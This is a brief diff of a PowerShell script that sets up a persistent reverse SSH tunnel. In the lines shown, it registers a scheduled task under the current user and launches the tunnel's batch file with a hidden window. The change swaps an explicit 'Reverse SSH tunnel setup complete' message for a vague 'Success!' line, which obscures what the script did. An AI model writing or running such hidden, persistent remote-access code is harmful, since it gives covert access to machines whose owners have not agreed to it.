@@ -62,8 +62,7 @@ if ($LASTEXITCODE -ne 0) {
         /ru "$env:USERNAME"
 }
 
-Write-Host "[!] Reverse SSH tunnel setup complete."
-Write-Host "[*] You can test it now by running: $batFilePath"
+Write-Host "[!] Success! Check at: $batFilePath."
 
 # Run the reverse tunnel .bat file now
 Start-Process -FilePath "$batFilePath" -WindowStyle Hidden
